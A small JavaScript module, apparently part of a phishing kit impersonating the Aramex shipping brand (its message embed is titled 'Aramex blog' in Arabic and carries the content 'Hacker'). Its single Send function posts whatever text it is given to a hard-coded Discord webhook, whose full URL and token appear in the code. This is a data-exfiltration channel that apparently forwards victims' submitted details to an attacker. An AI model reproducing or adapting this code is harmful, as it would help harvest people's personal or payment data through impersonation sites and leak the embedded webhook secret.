import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1315034485514829824/N1XWsR2KeH1fMCJUhql3URQFdlqG08g4tp7HJQhRybHDr3C-sqWcw5mwp65LPU_sp2fC",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
